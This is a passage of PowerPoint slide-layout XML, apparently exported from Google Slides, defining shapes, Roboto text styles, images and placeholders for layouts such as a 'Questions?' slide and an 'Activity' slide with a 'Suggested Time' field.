          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr lvl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2600"/>
              <a:buNone/>
              <a:defRPr>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
        <p:nvSpPr>
          <p:cNvPr id="354" name="Google Shape;354;p51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1" rot="10800000">
            <a:off x="688800" y="692100"/>
            <a:ext cx="7766400" cy="3759300"/>
          </a:xfrm>
          <a:prstGeom prst="bracePair">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat"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51"/>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51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1450375" y="1039700"/>
            <a:ext cx="6244200" cy="3131700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr lvl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="3400"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr b="0" sz="3400">
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="2E5E73"/>
              </a:buClr>
              <a:buSzPts val="3400"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr sz="34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400"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr sz="34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400"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr sz="34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400"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr sz="34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400"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr sz="34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400"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr sz="34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400"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr sz="34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400"/>
              <a:buFont typeface="Roboto Light"/>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p:cSld name="CUSTOM_4_1_2_2">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="357" name="Shape 357"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="358" name="Google Shape;358;p52"/>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9" name="Google Shape;359;p52"/>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360" name="Google Shape;360;p52"/>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361" name="Google Shape;361;p52"/>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a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="3800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr b="0" sz="3800">
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="2E5E73"/>
              </a:buClr>
              <a:buSzPts val="3800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr sz="38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800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr sz="38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800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr sz="38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800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr sz="38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800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr sz="38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800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr sz="38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800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr sz="38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800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr sz="38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estions slide">
  <p:cSld name="CUSTOM_10_1_1_1_1_3">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="F2F2F2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="362" name="Shape 362"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="363" name="Google Shape;363;p53"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="2688450"/>
            <a:ext cx="9144000" cy="7524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b="1" lang="en" sz="4000">
                <a:solidFill>
                  <a:srgbClr val="2E5E73"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Questions?</a:t>
            </a:r>
            <a:endParaRPr sz="4000">
              <a:solidFill>
                <a:srgbClr val="2E5E73"/>
              </a:solidFill>
              <a:latin typeface="Roboto Light"/>
              <a:ea typeface="Roboto Light"/>
              <a:cs typeface="Roboto Light"/>
              <a:sym typeface="Roboto Light"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="364" name="Google Shape;364;p53"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3762650" y="1443625"/>
            <a:ext cx="1345550" cy="1054620"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="365" name="Google Shape;365;p53"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="9853" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="653025" y="3974475"/>
            <a:ext cx="870750" cy="1194250"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="366" name="Google Shape;366;p53"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="19665" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="1651350" y="4211600"/>
            <a:ext cx="783075" cy="957125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="367" name="Google Shape;367;p53"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="30598" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="3638200" y="4387525"/>
            <a:ext cx="712575" cy="752400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="368" name="Google Shape;368;p53"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="9853" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2655487" y="3820875"/>
            <a:ext cx="982713" cy="1347850"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="369" name="Google Shape;369;p53"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="9853" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4517888" y="3982537"/>
            <a:ext cx="870750" cy="1194250"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="370" name="Google Shape;370;p53"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="5687" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="5979175" y="4016252"/>
            <a:ext cx="783075" cy="1123675"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="371" name="Google Shape;371;p53"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7223650" y="3820875"/>
            <a:ext cx="870750" cy="132480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slide">
  <p:cSld name="CUSTOM_23_3">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="F2F2F2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="372" name="Shape 372"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="373" name="Google Shape;373;p54"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="136025" y="2336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54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-5875" y="203600"/>
            <a:ext cx="9168600" cy="393600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="91425" lIns="822950" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2400">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Activity </a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2400">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="375" name="Google Shape;375;p54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5901175" y="3977950"/>
            <a:ext cx="2872200" cy="434400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="0" lIns="640075" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Suggested Time</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="376" name="Google Shape;376;p54"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="929900"/>
            <a:ext cx="7337400" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:schemeClr val="dk2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="oval"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="377" name="Google Shape;377;p54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="818575" y="1726975"/>
            <a:ext cx="6518700" cy="2116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78" name="Google Shape;378;p54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4398800"/>
            <a:ext cx="8703600" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr lvl="0" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr/>
            </a:lvl1pPr>
            <a:lvl2pPr lvl="1" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr/>
            </a:lvl2pPr>
            <a:lvl3pPr lvl="2" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr/>
            </a:lvl3pPr>
            <a:lvl4pPr lvl="3" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr/>
            </a:lvl4pPr>
            <a:lvl5pPr lvl="4" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr/>
            </a:lvl5pPr>
            <a:lvl6pPr lvl="5" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr/>
            </a:lvl6pPr>
            <a:lvl7pPr lvl="6" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr/>
            </a:lvl7pPr>
            <a:lvl8pPr lvl="7" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr/>
            </a:lvl8pPr>
            <a:lvl9pPr lvl="8" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buNone/>
              <a:defRPr/>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p/>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="379" name="Google Shape;379;p54"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="222821" y="323175"/>
            <a:ext cx="399107" cy="393600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="380" name="Google Shape;380;p54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-6000" y="478650"/>
            <a:ext cx="9168600" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="8229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Font typeface="Roboto"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr lvl="2">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr lvl="3">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr lvl="4">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr lvl="5">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr lvl="6">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr lvl="7">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr lvl="8">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>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Text Only">
  <p:cSld name="CUSTOM_2_7_2_2">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="381" name="Shape 381"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="382" name="Google Shape;382;p55"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-12125" y="0"/>
            <a:ext cx="9168600" cy="533700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="457200" spcFirstLastPara="1" rIns="274300" wrap="square" tIns="182875">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr lvl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
              <a:defRPr sz="2400">
                <a:latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>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383" name="Google Shape;383;p55"/>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a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
              <a:defRPr sz="1800"/>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cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="384" name="Google Shape;384;p55"/>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385" name="Google Shape;385;p55"/>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86" name="Google Shape;386;p55"/>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87" name="Google Shape;387;p55"/>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a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
              <a:defRPr sz="700">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388" name="Google Shape;388;p55"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="175" y="1284250"/>
            <a:ext cx="9144000" cy="3622200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="914400" lIns="457200" spcFirstLastPara="1" rIns="457200" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr indent="-342900" lvl="0" marL="457200">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
              <a:defRPr/>
            </a:lvl1pPr>
            <a:lvl2pPr indent="-342900" lvl="1" marL="914400">
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="○"/>
              <a:defRPr/>
            </a:lvl2pPr>
            <a:lvl3pPr indent="-342900" lvl="2" marL="1371600">
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="■"/>
              <a:defRPr/>
            </a:lvl3pPr>
            <a:lvl4pPr indent="-342900" lvl="3" marL="1828800">
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
              <a:defRPr/>
            </a:lvl4pPr>
            <a:lvl5pPr indent="-342900" lvl="4" marL="2286000">
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
